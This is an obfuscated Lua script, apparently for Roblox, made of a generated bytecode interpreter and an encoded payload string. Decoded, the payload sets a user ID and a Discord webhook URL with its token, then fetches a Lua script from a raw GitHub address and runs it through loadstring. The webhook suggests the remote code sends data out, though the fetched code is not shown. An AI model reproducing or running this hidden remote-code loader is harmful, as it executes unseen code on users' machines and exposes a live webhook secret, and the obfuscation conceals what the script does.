--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.4) ~  Much Love, Ferib 

]]--

do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 0;
		local v19;
		local v20;
		local v21;
		local v22;
		local v23;
		local v24;
		local v25;
		local v26;
		local v27;
		local v28;
		local v29;
		local v30;
		while true do
			if (v18 == 5) then
				v27 = v24;
				v28 = nil;
				v28 = function(...)
					return {...}, v12("#", ...);
				end;
				v18 = 6;
			end
			if (v18 == 0) then
				v19 = 1;
				v20 = nil;
				v16 = v4(v3(v16, 5), "..", function(v31)
					if (v1(v31, 2) == 79) then
						local v74 = 0;
						while true do
							if (v74 == 0) then
								v20 = v0(v3(v31, 1, 1));
								return "";
							end
						end
					else
						local v75 = 0;
						local v76;
						while true do
							if (v75 == 0) then
								v76 = v2(v0(v31, 16));
								if v20 then
									local v97 = v5(v76, v20);
									v20 = nil;
									return v97;
								else
									return v76;
								end
								break;
							end
						end
					end
				end);
				v18 = 1;
			end
			if (v18 == 2) then
				v22 = function()
					local v39 = v1(v16, v19, v19);
					v19 = v19 + 1;
					return v39;
				end;
				v23 = nil;
				v23 = function()
					local v40, v41 = v1(v16, v19, v19 + (2 - 0));
					v19 = v19 + (2 - 0);
					return (v41 * 256) + v40;
				end;
				v18 = 3;
			end
			if (v18 == 6) then
				v29 = nil;
				v29 = function()
					local v42 = 0;
					local v43;
					local v44;
					local v45;
					local v46;
					local v47;
					local v48;
					local v49;
					while true do
						if (v42 ~= (7 - 4)) then
						else
							v49 = nil;
							while true do
								local v81 = 0;
								while true do
									if (v81 == 1) then
										if ((0 - 0) ~= v43) then
										else
											local v103 = 0;
											local v104;
											while true do
												if (v103 == (0 + 0)) then
													v104 = 1364 - (1153 + 211);
													while true do
														if (v104 ~= 1) then
														else
															v46 = {};
															v43 = 1;
															break;
														end
														if ((0 - 0) == v104) then
															local v111 = 820 - (340 + 480);
															while true do
																if (v111 == (1368 - (565 + 802))) then
																	v104 = 1037 - (279 + 757);
																	break;
																end
																if (v111 == (1734 - (1137 + 597))) then
																	v44 = {};
																	v45 = {};
																	v111 = 2 - 1;
																end
															end
														end
													end
													break;
												end
											end
										end
										if (v43 == (829 - (312 + 515))) then
											local v105 = 0 - 0;
											local v106;
											while true do
												if (v105 ~= (0 - 0)) then
												else
													v106 = 0 - 0;
													while true do
														if (v106 ~= (590 - (147 + 443))) then
														else
															local v112 = 0 + 0;
															while true do
																if (v112 == 1) then
																	v106 = 1;
																	break;
																end
																if (v112 == (0 - 0)) then
																	for v128 = 1 - 0, v48 do
																		local v129 = 0;
																		local v130;
																		local v131;
																		local v132;
																		local v133;
																		while true do
																			if (v129 == (1104 - (444 + 660))) then
																				v130 = 0;
																				v131 = nil;
																				v129 = 309 - (266 + 42);
																			end
																			if (v129 ~= (5 - 3)) then
																			else
																				while true do
																					if (v130 == (1 + 0)) then
																						v133 = nil;
																						while true do
																							if (v131 ~= 1) then
																							else
																								if (v132 == (1 + 0)) then
																									v133 = v22() ~= (0 + 0);
																								elseif (v132 == (1902 - (1160 + 740))) then
																									v133 = v25();
																								elseif (v132 == 3) then
																									v133 = v26();
																								end
																								v49[v128] = v133;
																								break;
																							end
																							if (v131 ~= (0 + 0)) then
																							else
																								local v175 = 0 + 0;
																								local v176;
																								while true do
																									if (v175 == (506 - (157 + 349))) then
																										v176 = 0 - 0;
																										while true do
																											if ((0 + 0) ~= v176) then
																											else
																												local v194 = 0;
																												while true do
																													if ((976 - (783 + 193)) == v194) then
																														v132 = v22();
																														v133 = nil;
																														v194 = 1;
																													end
																													if (v194 == (3 - 2)) then
																														v176 = 1735 - (1004 + 730);
																														break;
																													end
																												end
																											end
																											if ((1 + 0) ~= v176) then
																											else
																												v131 = 1;
																												break;
																											end
																										end
																										break;
																									end
																								end
																							end
																						end
																						break;
																					end
																					if (v130 == (0 - 0)) then
																						local v159 = 0;
																						local v160;
																						while true do
																							if (v159 ~= (0 - 0)) then
																							else
																								v160 = 0;
																								while true do
																									if ((0 - 0) == v160) then
																										local v187 = 0;
																										while true do
																											if (v187 == (143 - (45 + 97))) then
																												v160 = 1;
																												break;
																											end
																											if (v187 == 0) then
																												v131 = 0;
																												v132 = nil;
																												v187 = 80 - (67 + 12);
																											end
																										end
																									end
																									if (v160 == (1 + 0)) then
																										v130 = 1843 - (1307 + 535);
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																				end
																				break;
																			end
																			if (v129 ~= (4 - 3)) then
																			else
																				v132 = nil;
																				v133 = nil;
																				v129 = 3 - 1;
																			end
																		end
																	end
																	v47[3 + 0] = v22();
																	v112 = 1 + 0;
																end
															end
														end
														if (v106 ~= (1 + 0)) then
														else
															for v115 = 1, v24() do
																local v116 = 0;
																local v117;
																local v118;
																while true do
																	if (v116 ~= (0 - 0)) then
																	else
																		v117 = 0;
																		v118 = nil;
																		v116 = 1903 - (456 + 1446);
																	end
																	if (v116 == (1 + 0)) then
																		while true do
																			if (v117 == (0 + 0)) then
																				v118 = v22();
																				if (v21(v118, 1 + 0, 1) ~= (0 + 0)) then
																				else
																					local v154 = 1098 - (1014 + 84);
																					local v155;
																					local v156;
																					local v157;
																					local v158;
																					while true do
																						if (v154 ~= (1 - 0)) then
																						else
																							local v170 = 1760 - (1021 + 739);
																							while true do
																								if (v170 == (702 - (32 + 670))) then
																									v157 = nil;
																									v158 = nil;
																									v170 = 1446 - (523 + 922);
																								end
																								if (v170 ~= (3 - 2)) then
																								else
																									v154 = 420 - (222 + 196);
																									break;
																								end
																							end
																						end
																						if (v154 == 0) then
																							v155 = 0 + 0;
																							v156 = nil;
																							v154 = 1 + 0;
																						end
																						if (v154 == (2 + 0)) then
																							while true do
																								if (v155 ~= (490 - (381 + 106))) then
																								else
																									if (v21(v157, 196 - (118 + 75), 631 - (195 + 433)) == 1) then
																										v158[4] = v49[v158[3 + 1]];
																									end
																									v44[v115] = v158;
																									break;
																								end
																								if (v155 == 2) then
																									local v179 = 1617 - (1364 + 253);
																									local v180;
																									while true do
																										if (v179 ~= 0) then
																										else
																											v180 = 0 + 0;
																											while true do
																												if (v180 == (0 + 0)) then
																													local v195 = 0 + 0;
																													while true do
																														if (v195 ~= (1 - 0)) then
																														else
																															v180 = 1;
																															break;
																														end
																														if ((0 - 0) == v195) then
																															if (v21(v157, 1, 1738 - (1408 + 329)) ~= (2 - 1)) then
																															else
																																v158[2 + 0] = v49[v158[2 + 0]];
																															end
																															if (v21(v157, 131 - (75 + 54), 1365 - (664 + 699)) ~= 1) then
																															else
																																v158[2 + 1] = v49[v158[341 - (222 + 116)]];
																															end
																															v195 = 1;
																														end
																													end
																												end
																												if (v180 == (2 - 1)) then
																													v155 = 8 - 5;
																													break;
																												end
																											end
																											break;
																										end
																									end
																								end
																								if (v155 == (169 - (108 + 60))) then
																									local v181 = 0 - 0;
																									local v182;
																									local v183;
																									while true do
																										if ((925 - (896 + 28)) ~= v181) then
																										else
																											while true do
																												if (v182 ~= 0) then
																												else
																													v183 = 0 - 0;
																													while true do
																														if (v183 ~= (0 + 0)) then
																														else
																															local v196 = 362 - (78 + 284);
																															while true do
																																if (v196 ~= (1 - 0)) then
																																else
																																	v183 = 1 + 0;
																																	break;
																																end
																																if (v196 == (0 - 0)) then
																																	v158 = {v23(),v23(),nil,nil};
																																	if (v156 == 0) then
																																		local v202 = 1587 - (887 + 700);
																																		local v203;
																																		local v204;
																																		local v205;
																																		while true do
																																			if (v202 == 0) then
																																				v203 = 0 - 0;
																																				v204 = nil;
																																				v202 = 1;
																																			end
																																			if ((927 - (176 + 750)) ~= v202) then
																																			else
																																				v205 = nil;
																																				while true do
																																					if (v203 ~= 1) then
																																					else
																																						while true do
																																							if (v204 == 0) then
																																								v205 = 0;
																																								while true do
																																									if (v205 == 0) then
																																										v158[3] = v23();
																																										v158[1 + 3] = v23();
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																					if (v203 ~= (0 - 0)) then
																																					else
																																						v204 = 0 + 0;
																																						v205 = nil;
																																						v203 = 1 - 0;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	elseif (v156 == (1 + 0)) then
																																		v158[4 - 1] = v24();
																																	elseif (v156 == (730 - (497 + 231))) then
																																		v158[1 + 2] = v24() - ((9 - 7) ^ (21 - 5));
																																	elseif (v156 ~= (4 - 1)) then
																																	else
																																		local v208 = 0 - 0;
																																		local v209;
																																		local v210;
																																		while true do
																																			if (v208 == (1 + 0)) then
																																				while true do
																																					if ((0 - 0) == v209) then
																																						v210 = 0;
																																						while true do
																																							if (v210 == (1595 - (82 + 1513))) then
																																								v158[707 - (336 + 368)] = v24() - ((2 + 0) ^ (11 + 5));
																																								v158[3 + 1] = v23();
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																			if (v208 == (1310 - (587 + 723))) then
																																				v209 = 0 - 0;
																																				v210 = nil;
																																				v208 = 4 - 3;
																																			end
																																		end
																																	end
																																	v196 = 1;
																																end
																															end
																														end
																														if (v183 == 1) then
																															v155 = 1580 - (1047 + 531);
																															break;
																														end
																													end
																													break;
																												end
																											end
																											break;
																										end
																										if (v181 ~= 0) then
																										else
																											v182 = 0 + 0;
																											v183 = nil;
																											v181 = 403 - (137 + 265);
																										end
																									end
																								end
																								if (v155 == (0 + 0)) then
																									local v184 = 0;
																									local v185;
																									local v186;
																									while true do
																										if ((173 - (12 + 161)) == v184) then
																											v185 = 0;
																											v186 = nil;
																											v184 = 1547 - (1316 + 230);
																										end
																										if ((1 + 0) == v184) then
																											while true do
																												if (v185 ~= (0 - 0)) then
																												else
																													v186 = 0 - 0;
																													while true do
																														if (v186 == (0 + 0)) then
																															local v197 = 0 - 0;
																															while true do
																																if ((1772 - (999 + 772)) ~= v197) then
																																else
																																	v186 = 1092 - (752 + 339);
																																	break;
																																end
																																if (v197 ~= (0 + 0)) then
																																else
																																	v156 = v21(v118, 2, 7 - 4);
																																	v157 = v21(v118, 1397 - (1179 + 214), 2 + 4);
																																	v197 = 1;
																																end
																															end
																														end
																														if (v186 == (1 - 0)) then
																															v155 = 1 + 0;
																															break;
																														end
																													end
																													break;
																												end
																											end
																											break;
																										end
																									end
																								end
																							end
																							break;
																						end
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															v43 = 3;
															break;
														end
													end
													break;
												end
											end
										end
										break;
									end
									if (v81 == 0) then
										if (v43 == (1523 - (174 + 1346))) then
											local v107 = 0 + 0;
											while true do
												local v109 = 0 + 0;
												while true do
													if (v109 == (0 + 0)) then
														if (v107 == (2 - 1)) then
															return v47;
														end
														if ((0 - 0) == v107) then
															local v113 = 0 - 0;
															while true do
																if (v113 ~= (0 + 0)) then
																else
																	for v134 = 1, v24() do
																		v45[v134 - 1] = v29();
																	end
																	for v136 = 1565 - (631 + 933), v24() do
																		v46[v136] = v24();
																	end
																	v113 = 1 + 0;
																end
																if (v113 ~= (1 - 0)) then
																else
																	v107 = 1 - 0;
																	break;
																end
															end
														end
														break;
													end
												end
											end
										end
										if (v43 ~= (1300 - (1056 + 243))) then
										else
											local v108 = 0 + 0;
											while true do
												if (v108 == (677 - (221 + 455))) then
													v49 = {};
													v43 = 4 - 2;
													break;
												end
												if ((1861 - (139 + 1722)) ~= v108) then
												else
													v47 = {v44,v45,nil,v46};
													v48 = v24();
													v108 = 1;
												end
											end
										end
										v81 = 1;
									end
								end
							end
							break;
						end
						if (v42 ~= 2) then
						else
							v47 = nil;
							v48 = nil;
							v42 = 3;
						end
						if (v42 == (0 + 0)) then
							v43 = 1672 - (435 + 1237);
							v44 = nil;
							v42 = 1 - 0;
						end
						if (v42 == (1 + 0)) then
							v45 = nil;
							v46 = nil;
							v42 = 1341 - (625 + 714);
						end
					end
				end;
				v30 = nil;
				v18 = 7;
			end
			if (7 == v18) then
				v30 = function(v32, v33, v34)
					local v50 = v32[1];
					local v51 = v32[2];
					local v52 = v32[3];
					return function(...)
						local v66 = 0;
						local v67;
						local v68;
						local v69;
						local v70;
						local v71;
						while true do
							if (v66 == 3) then
								A, B = v28(v11(v71));
								if not A[1] then
									local v92 = 0;
									local v93;
									while true do
										if (v92 == 0) then
											v93 = v32[4][v67] or "?";
											error("Script error at [" .. v93 .. "]:" .. A[2]);
											break;
										end
									end
								else
									return v13(A, 2, B);
								end
								break;
							end
							if (v66 == 1) then
								v69 = {...};
								v70 = v12("#", ...) - 1;
								v66 = 2;
							end
							if (v66 == 2) then
								v71 = nil;
								v71 = function()
									local v82 = v50;
									local v83 = v51;
									local v84 = v52;
									local v85 = v28;
									local v86 = {};
									local v87 = {};
									local v88 = {};
									for v94 = 1446 - (493 + 953), v70 do
										if (((5367 - (681 + 1225)) == (4724 - (270 + 993))) and (v94 >= v84)) then
											v86[v94 - v84] = v69[v94 + (2 - (1 + 0))];
										else
											v88[v94] = v69[v94 + (2 - (1 + 0))];
										end
									end
									local v89 = (v70 - v84) + (1 - 0);
									local v90;
									local v91;
									while true do
										local v95 = 1016 - ((500 - 197) + 713);
										local v96;
										while true do
											if ((v95 == 0) or ((1141 - 492) >= (2594 - (189 + 515)))) then
												v96 = 0 - 0;
												while true do
													if ((v96 == (1 + 0)) or (2465 <= (2687 - 566))) then
														if ((v91 <= (7 - (3 + 0))) or (467 > (3164 - (107 + 1651)))) then
															if ((v91 <= (1694 - (970 + 723))) or ((4612 - (94 + 20)) < (430 + 2685))) then
																if ((v91 == (1654 - (1043 + 611))) or ((1503 + 716) == ((1480 - 772) - (270 + 92)))) then
																	v88[v90[209 - (67 + 140)]] = v34[v90[3 + 0]];
																elseif (((4585 - 1789) > 1157) and (v88[v90[5 - 3]] == v90[(4 + 4) - 4])) then
																	v67 = v67 + (1 - 0);
																else
																	v67 = v90[11 - 8];
																end
															elseif (((2732 - (20 + 48)) > (694 + (1386 - 768))) and (v91 <= (4 - 2))) then
																v88[v90[3 - 1]]();
															elseif ((v91 > (1 + 2)) or ((6777 - (546 + 1409)) <= (2775 + 528))) then
																v67 = v90[13 - 10];
															else
																local v140 = 0 + 0;
																local v141;
																local v142;
																while true do
																	if ((4953 > 841) and (v140 == (1 + 0))) then
																		while true do
																			if ((v141 == (797 - (584 + 213))) or ((967 - 503) > (11745 - 8819))) then
																				v142 = v90[1 + 1];
																				v88[v142] = v88[v142](v13(v88, v142 + 1, v68));
																				break;
																			end
																		end
																		break;
																	end
																	if ((v140 == 0) or ((4402 - (726 + 611)) < (196 + 137))) then
																		v141 = 0 + 0;
																		v142 = nil;
																		v140 = (90 + 184) - (49 + 224);
																	end
																end
															end
														elseif ((v91 <= ((3 + 10) - 7)) or ((20540 - 16421) < (10 + 34 + 162))) then
															if ((836 <= (3743 - (62 + 364))) and (v91 > (19 - (6 + 8)))) then
																v88[v90[2 + 0]] = v90[2 + 1];
															else
																do
																	return;
																end
															end
														elseif ((v91 <= (6 + 1)) or ((4018 - (136 + 709)) == (2782 - ((1314 - 686) + 186)))) then
															v88[v90[2]][v90[1226 - (293 + 930)]] = v90[4];
														elseif ((2922 < ((25714 - 16929) - (6519 - (179 + 1690)))) and (v91 == (16 - 8))) then
															local v143 = 1305 - (417 + 888);
															local v144;
															local v145;
															local v146;
															while true do
																if ((((1 + 1) - 1) == v143) or ((2977 + 1183) <= 275)) then
																	v146 = nil;
																	while true do
																		if ((635 < (9353 - 5901)) and (v144 == (4 - 3))) then
																			v88[v145 + 1] = v146;
																			v88[v145] = v146[v90[438 - (393 + 41 + 0)]];
																			break;
																		end
																		if ((v144 == ((0 - 0) - 0)) or ((4361 - (422 + 978)) > (4788 - (946 + (473 - 277))))) then
																			local v166 = 0 - 0;
																			local v167;
																			while true do
																				if ((v166 == (0 + (1479 - (185 + 1294)))) or (3189 == (1405 - ((14 - 6) + 59)))) then
																					v167 = 203 - (65 + 138);
																					while true do
																						if (((2 - 1) == v167) or (4860 <= (3054 - 1229))) then
																							v144 = 1 + 0;
																							break;
																						end
																						if (((1129 - (730 + 37)) < (6313 - (126 + 1708))) and (v167 == (0 + 0))) then
																							v145 = v90[7 - 5];
																							v146 = v88[v90[3]];
																							v167 = 1;
																						end
																					end
																					break;
																				end
																			end
																		end
																	end
																	break;
																end
																if ((v143 == 0) or ((2235 - (416 + 1032)) > 2244)) then
																	local v153 = 118 - (17 + 101);
																	while true do
																		if ((v153 == (0 - 0)) or ((2879 - (25 + 212)) <= 1193)) then
																			v144 = 793 - (234 + 540 + 19);
																			v145 = nil;
																			v153 = 2 - 1;
																		end
																		if (((4230 - 2310) > (1528 - ((441 - (87 + 350)) + 47))) and (v153 == (2 - 1))) then
																			v143 = 159 - (115 + 43);
																			break;
																		end
																	end
																end
															end
														else
															local v147 = 0;
															local v148;
															local v149;
															local v150;
															local v151;
															local v152;
															while true do
																if ((((9580 - 4810) - (1032 + 503)) >= (3120 - 2210)) and (v147 == 2)) then
																	v152 = nil;
																	while true do
																		if ((v148 == ((0 - 0) - 0)) or (1301 > (4994 - (160 + (2003 - (1204 + 764)))))) then
																			local v168 = 0 - 0;
																			while true do
																				if ((v168 == ((4172 - 2540) - (588 + 1043))) or ((300 + 505) == (1269 - 822))) then
																					v148 = 1 - 0;
																					break;
																				end
																				if (((3887 - 1851) < (4081 - (351 + 544 + 303))) and (v168 == (0 - 0))) then
																					v149 = v90[1876 - (1493 + 381)];
																					v150, v151 = v85(v88[v149](v13(v88, v149 + ((1 + 0) - 0), v90[3])));
																					v168 = 1;
																				end
																			end
																		end
																		if (((473 - (149 + 80)) <= 2960) and (v148 == (6 - (3 + 1)))) then
																			for v171 = v149, v68 do
																				local v172 = 0 + 0;
																				local v173;
																				while true do
																					if ((v172 == (0 + 0)) or ((8423 - (13681 - 9255)) < (1706 + 1656))) then
																						v173 = 0;
																						while true do
																							if (((2559 - (430 + 1378)) <= (1603 - (1635 - 935))) and (v173 == (1685 - (530 + 1155)))) then
																								v152 = v152 + (1 - 0);
																								v88[v171] = v150[v152];
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			break;
																		end
																		if ((v148 == (2 - 1)) or (2552 >= (8852 - 5892))) then
																			local v169 = 0 + (0 - 0);
																			while true do
																				if ((((8670 - 6350) - (1895 + 104)) <= (21537 - 16566)) and (v169 == (3 - 2))) then
																					v148 = 2;
																					break;
																				end
																				if ((((20 - (11 + 9)) - 0) == v169) or ((6845 - (6439 - (1137 + 397))) >= (10314 - 6653))) then
																					v68 = (v151 + v149) - (1 + 0 + 0);
																					v152 = 0 - 0;
																					v169 = 1;
																				end
																			end
																		end
																	end
																	break;
																end
																if ((((10808 - 8271) - (166 + 538)) <= 4462) and (v147 == (0 + 0))) then
																	v148 = 0 - (0 + 0);
																	v149 = nil;
																	v147 = (1 + 0) - 0;
																end
																if ((v147 == (1962 - (1327 + 634))) or ((1689 - (669 + 51)) < (2247 - (1016 + 317)))) then
																	v150 = nil;
																	v151 = nil;
																	v147 = 2;
																end
															end
														end
														v67 = v67 + (1 - 0);
														break;
													end
													if ((v96 == (781 - (19 + 762))) or ((1429 - 816) >= (2226 + 2308))) then
														local v110 = 0 - 0;
														while true do
															if (((5217 - 1069) == (4431 - (7 + 276))) and (v110 == (0 + 0))) then
																local v114 = 0 + 0;
																while true do
																	if ((v114 == (0 + 0)) or ((237 - 129) >= (30 + (2622 - (889 + 164))))) then
																		v90 = v82[v67];
																		v91 = v90[1];
																		v114 = 1 + 0;
																	end
																	if (((111 - (85 + 25)) == v114) or ((243 + 156 + 665) == (8206 - 4189))) then
																		v110 = (473 - (391 + 81)) - 0;
																		break;
																	end
																end
															end
															if ((v110 == (1938 - (1617 + 320))) or ((1949 - (2117 - (752 + 607))) == (595 + 673))) then
																v96 = 1 + 0;
																break;
															end
														end
													end
												end
												break;
											end
										end
									end
								end;
								v66 = 3;
							end
							if (v66 == 0) then
								v67 = 1;
								v68 = -1;
								v66 = 1;
							end
						end
					end;
				end;
				return v30(v29(), {}, v17)(...);
			end
			if (v18 == 3) then
				v24 = nil;
				v24 = function()
					local v53, v54, v55, v56 = v1(v16, v19, v19 + (110 - ((58 - 27) + 76)));
					v19 = v19 + (555 - (396 + 155));
					return (v56 * 16777216) + (v55 * (65959 - (416 + 7))) + (v54 * 256) + v53;
				end;
				v25 = nil;
				v18 = 4;
			end
			if (v18 == 4) then
				v25 = function()
					local v57 = 0 + 0;
					local v58;
					local v59;
					local v60;
					local v61;
					local v62;
					local v63;
					while true do
						if ((1228 - (273 + 319 + 635)) == v57) then
							v60 = 1902 - (871 + 1030);
							v61 = (v21(v59, 1177 - (66 + 1110), 824 - (680 + 124)) * ((1400 - (1303 + 95)) ^ (24 + 8))) + v58;
							v57 = 7 - 5;
						end
						if (v57 == 2) then
							v62 = v21(v59, 360 - (288 + 51), (1540 - (178 + 1352)) + (44 - 23));
							v63 = ((v21(v59, 1010 - (781 + 197)) == (2 - (1 + 0))) and -(2 - 1)) or (2 - 1);
							v57 = 1485 - (673 + 131 + 678);
						end
						if (v57 == (0 - 0)) then
							v58 = v24();
							v59 = v24();
							v57 = 4 - 3;
						end
						if (v57 == (3 + 0)) then
							if (v62 == (0 - 0)) then
								if (v61 == (0 + 0)) then
									return v63 * 0;
								else
									local v98 = 0 + 0;
									while true do
										if (v98 == (0 - 0)) then
											v62 = 326 - (117 + 208);
											v60 = (0 + 0) - 0;
											break;
										end
									end
								end
							elseif (v62 == (1044 + 1003)) then
								return ((v61 == (0 - 0)) and (v63 * ((1 + 0) / (0 + 0)))) or (v63 * NaN);
							end
							return v8(v63, v62 - (377 + 472 + 174)) * (v60 + (v61 / ((507 - (255 + 250)) ^ 52)));
						end
					end
				end;
				v26 = nil;
				v26 = function(v35)
					local v64;
					if not v35 then
						local v77 = (2110 - 982) - ((1027 - 679) + 780);
						while true do
							if (v77 == ((733 - 247) - (84 + 402))) then
								v35 = v24();
								if (v35 == (369 - (226 + 143))) then
									return "";
								end
								break;
							end
						end
					end
					v64 = v3(v16, v19, (v19 + v35) - (1 + 0));
					v19 = v19 + v35;
					local v65 = {};
					for v72 = 1745 - (1433 + 311), #v64 do
						v65[v72] = v2(v1(v3(v64, v72, v72)));
					end
					return v6(v65);
				end;
				v18 = 5;
			end
			if (v18 == 1) then
				v21 = nil;
				v21 = function(v36, v37, v38)
					if v38 then
						local v78 = (v36 / ((1 + 1) ^ (v37 - 1))) % ((5 - 3) ^ (((v38 - (1 + 0)) - (v37 - (513 - (488 + 24)))) + 1 + 0));
						return v78 - (v78 % (1 + (1958 - (1359 + 599))));
					else
						local v79 = 0 - 0;
						local v80;
						while true do
							if (v79 == (1869 - (1814 + 55))) then
								v80 = 2 ^ (v37 - (1 + (1137 - (702 + 435))));
								return (((v36 % (v80 + v80)) >= v80) and (3 - 2)) or (0 - 0);
							end
						end
					end
				end;
				v22 = nil;
				v18 = 2;
			end
		end
	end
	v15("LOL!0B3O00028O00026O00F03F03023O005F4703063O00557365724944022O0020095448E24103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31303735382O3237333239313633312O302O372F5968674772482O576E5A744D7A4B6F69782D6E4454796352352D72543243735849785A55796D735A4C50723143497A734870335442716266625A7069397A414C70775830030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F72692O7A6875622F6D61696E2F5363726970742E6C7561001C3O0012063O00013O0026013O001000010001002O043O00100001001206000100013O0026010001000800010002002O043O000800010012063O00023O002O043O001000010026010001000400010001002O043O0004000100122O000200033O00300700020004000500122O000200033O003007000200060007001206000100023O002O043O000400010026013O000100010002002O043O0001000100122O000100083O00122O000200093O00200800020002000A0012060004000B4O0009000200044O000300013O00022O0002000100010001002O043O001B0001002O043O000100012O00053O00017O001C3O00023O00043O00043O00053O00073O00073O00083O00093O000B3O000B3O000C3O000C3O000D3O000D3O000E3O000F3O00123O00123O00133O00133O00133O00133O00133O00133O00133O00143O00153O00173O00", v9(), ...);
end
